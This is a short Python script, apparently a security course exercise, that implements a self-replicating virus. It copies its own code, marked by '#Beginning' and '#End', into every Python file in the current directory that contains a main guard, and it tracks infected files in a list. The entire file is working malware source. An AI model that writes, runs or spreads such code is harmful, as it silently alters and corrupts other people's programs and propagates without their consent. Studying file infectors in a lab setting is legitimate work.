#Beginning
import os
import sys
import glob

INFECTED_LIST_FILENAME = 'infected_files.list'

def confirm_script(file, script_lines):
    for line in script_lines:
        if "if __name__ == \"__main__\":" in script_lines:
           return True
    return False

def readVirus():
    with open(str(__file__), "r") as f:
        virus = []
        line = f.readline()
        
        # Move to virus start spot
        while line and line.strip() != "#Beginning":
            line = f.readline()
        
        # Copy until end of virus (including the #End)
        while line and line.strip() != "#End":
            virus.append(line)
            line = f.readline()
        
        # Append the #End tag after finishing reading
        virus.append("#End\n")
    return virus

def writeVirus(file):
    file.writelines(virus)

def alreadyInfected(file_name):
    if os.path.exists(INFECTED_LIST_FILENAME):
        with open(INFECTED_LIST_FILENAME, "r") as f:
            infected_files = [line.strip() for line in f.readlines()] # strip newline characters
            return file_name in infected_files
    return False
def markAsInfected(file_name):
    with open(INFECTED_LIST_FILENAME, "a") as f:
        f.write(file_name + '\n')

virus = readVirus()
file_names = glob.glob("*.py")
for file in file_names:
    if alreadyInfected(file):
        print(file, "is already infected.")
        continue
        
    with open(file, "r+") as f:
        lines = [l.strip() for l in f.readlines()]
                
        # check if script
        if not confirm_script(file, lines):
            print(file + " does not contain a python script")
            continue
            
        # check if virus is already there
        for line in virus:
            if line.strip() not in lines:
                writeVirus(f)
                markAsInfected(file)
                print("Virus successfully written into", file)
                break
        
with open("Q1C.out", "a") as f:
    line = sys.argv
    f.write('python3 ' + ' '.join(line) + '\n')